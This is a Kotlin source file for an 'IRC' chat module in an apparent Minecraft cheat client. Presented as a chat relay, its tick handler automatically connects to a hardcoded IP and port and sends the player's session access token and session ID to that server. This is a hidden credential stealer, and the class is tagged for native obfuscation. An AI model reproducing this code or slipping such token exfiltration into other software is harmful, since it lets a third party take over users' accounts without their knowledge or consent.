package kevin.module.modules.misc

import com.diaoling.network.info.record.OnlineUserInfo
import com.diaoling.network.packet.impl.info.GameInfoPacket
import com.diaoling.network.packet.impl.info.OnlineUsersPacket
import kevin.KevinClient
import kevin.event.*
import kevin.module.BooleanValue
import kevin.module.Module
import kevin.module.ModuleCategory
import kevin.utils.ChatUtils
import kevin.utils.ColorUtils
import kevin.utils.StringUtils
import net.minecraft.network.play.client.CPacketChatMessage
import net.minecraft.network.play.server.SPacketChat
import com.yumegod.obfuscation.Native

/**
 * @author DiaoLing
 * @since 3/28/2024
 */
@Native
class IRC : Module(name = "IRC", description = "Internet Relay Chat", category = ModuleCategory.MISC) {
    private var lastName: String? = null

    private val test = BooleanValue("别开",false)



    override fun onEnable() {
        this.reset()
    }

    override fun onDisable() {
        this.reset()

        if (KevinClient.socketManager.client.isConnected) {
            KevinClient.socketManager.client.disconnect()
        }
    }
    @EventTarget
    fun onPacket(event: PacketEvent) {
        val packet = event.packet
        if (packet is CPacketChatMessage) {
            if (packet.message.startsWith(KevinClient.socketManager.prefix)) {
                event.cancelEvent()
                KevinClient.socketManager.chat(packet.message.substring(KevinClient.socketManager.prefix.length))
                //ChatUtils.message(packet.message.substring(1,packet.message.length))
            }
        }
        if (packet is SPacketChat && test.get()) {
            if (packet.chatComponent.formattedText.contains("组队系统")) {
                event.cancelEvent()
            }
        }
    }

    @EventTarget
    fun onPlayerTick(event: UpdateEvent) {

        val name: String = mc.player.name
        val nameStr: String = name

        if (KevinClient.socketManager.client.isConnected) {
            if (lastName == null || lastName != nameStr) {
                KevinClient.socketManager.send(
                    GameInfoPacket(
                        nameStr,
                        mc.getSession().token,
                        mc.getSession().sessionID,
                        System.currentTimeMillis()
                    )
                )
                lastName = nameStr
            }
        } else {
            if (!KevinClient.socketManager.client.isConnecting) {
                KevinClient.socketManager.client.start("61.136.162.98", 45600)
            }
        }
    }

    @EventTarget
    fun onUpdate(event: UpdateEvent) {
        for (user in KevinClient.userManager.onlineUsers) {
            if (!KevinClient.friends.contains(user.inGameName)) {
                KevinClient.friends.add(user.inGameName)
                //ChatUtils.message(user.inGameName)
            }
        }
    }

    @EventTarget
    fun onText(event: TextEvent) {
        val thePlayer = mc.player

        if (thePlayer == null || event.text!!.startsWith("§l§7[§l§9${KevinClient.clientName}§l§7]") || event.text!!.contains("Friend"))
            return

        for (user in KevinClient.userManager.onlineUsers) {
            if (event.text!!.contains(user.inGameName)) {
                val str = event.text!!
                event.text = str.replace(user.inGameName,getString(user))
                return
            }
        }

    }

    @EventTarget
    fun onWorld(event: WorldEvent) {
        ChatUtils.message(KevinClient.userManager.onlineUsers.size.toString() + " users online")
        KevinClient.friends.clear()
    }

    fun reset() {
        this.lastName = null
    }
    fun getString(user: OnlineUserInfo): String {
        return "§aFriend " +"§f<§a" + user.client.name + "§f> §f(§e" + user.username + "§f) " + user.inGameName
    }

}